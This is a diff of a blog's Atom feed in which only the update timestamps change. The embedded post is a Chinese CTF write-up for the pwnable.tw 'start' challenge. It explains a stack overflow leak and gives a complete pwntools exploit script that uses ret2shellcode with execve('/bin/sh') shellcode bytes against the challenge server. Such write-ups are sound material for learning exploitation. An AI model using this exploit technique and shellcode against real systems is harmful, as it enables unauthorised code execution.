@@ -6,7 +6,7 @@
   <link href="https://ixout.github.io/atom.xml" rel="self"/>
   
   <link href="https://ixout.github.io/"/>
-  <updated>2023-03-20T06:26:27.121Z</updated>
+  <updated>2023-03-20T06:36:03.472Z</updated>
   <id>https://ixout.github.io/</id>
   
   <author>
@@ -21,7 +21,7 @@
     <link href="https://ixout.github.io/posts/10836/"/>
     <id>https://ixout.github.io/posts/10836/</id>
     <published>2023-03-20T01:01:55.000Z</published>
-    <updated>2023-03-20T06:26:27.121Z</updated>
+    <updated>2023-03-20T06:36:03.472Z</updated>
     
     <content type="html"><![CDATA[<h1 id="start"><a href="#start" class="headerlink" title="start"></a>start</h1><p>第一步检查保护,是久违的感觉😂</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_082554.png" alt=""></p><hr><p>ida打开看看</p><p>不难发现其不是标准栈帧结构,🔒以ida反汇编不了(百度可以搜索解决办法),好在不长直接看汇编代码吧.</p><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-20_091524.png" alt=""></p><p>程序主体是两个系统调用read和write,其中read读取60个字节明显有溢出,但要怎么利用是关键</p><p>首选自然是ret2shellcode了,但ret2shellcode需要栈地址,可以看到程序起始有向栈中压入esp,我们可以选择借用write系统调用将其泄露,剩下的就是常规操作了</p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(<span class="number">0x8048087</span>))</span><br><span class="line">stack=u32(p.recv(<span class="number">4</span>))+<span class="number">0x14</span> <span class="comment">#加14是因为最后又抬高了esp一次</span></span><br><span class="line">p.recv()</span><br><span class="line">sh=<span class="string">b&quot;\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb0\x0b\xcd\x80&quot;</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span>+p32(stack)+sh)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="https://cdn.staticaly.com/gh/ixout/picture@main/img/2023-03-201.png" alt=""></p><h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1>]]></content>
     
